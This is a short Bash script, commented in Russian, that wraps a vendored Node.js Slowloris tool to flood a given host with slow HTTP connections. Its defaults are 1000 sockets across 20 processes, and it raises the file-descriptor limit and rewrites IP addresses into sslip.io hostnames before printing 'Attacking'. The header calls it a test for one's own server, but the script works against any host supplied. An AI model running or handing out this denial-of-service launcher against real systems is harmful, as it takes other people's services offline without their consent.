#!/bin/bash
# Slowloris-тест для собственного сервера (Node.js fork-based).
# Использование: ./slowloris.sh -h HOST [-p PORT] [-c CONNECTIONS] [-i INSTANCES]

HOST=""
PORT=80
CONNECTIONS=1000
INSTANCES=20

usage() {
    echo "Использование: $0 -h HOST [-p PORT] [-c CONNECTIONS_PER_INSTANCE] [-i INSTANCES]"
    exit 1
}

while getopts "h:p:c:i:" opt; do
    case $opt in
        h) HOST="$OPTARG" ;;
        p) PORT="$OPTARG" ;;
        c) CONNECTIONS="$OPTARG" ;;
        i) INSTANCES="$OPTARG" ;;
        *) usage ;;
    esac
done

[ -z "$HOST" ] && usage

SCRIPT="$HOME/slowattack_bash/vendor-slowloris/lib/index.js"
if [ ! -f "$SCRIPT" ]; then
    echo "[-] Скрипт не найден: $SCRIPT"
    echo "    Сначала запустите: bash install.sh"
    exit 1
fi

ulimit -n 65535 2>/dev/null || true

PROTO="http"
if [ "$PORT" = "443" ]; then
    PROTO="https"
fi

URL_HOST="$HOST"
if [[ "$HOST" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    URL_HOST="${HOST}.sslip.io"
fi

echo "[+] Атакую $PROTO://$URL_HOST:$PORT — $CONNECTIONS сокетов × $INSTANCES процессов"
node "$SCRIPT" -p "$PORT" -s "$CONNECTIONS" -i "$INSTANCES" "$PROTO://$URL_HOST"
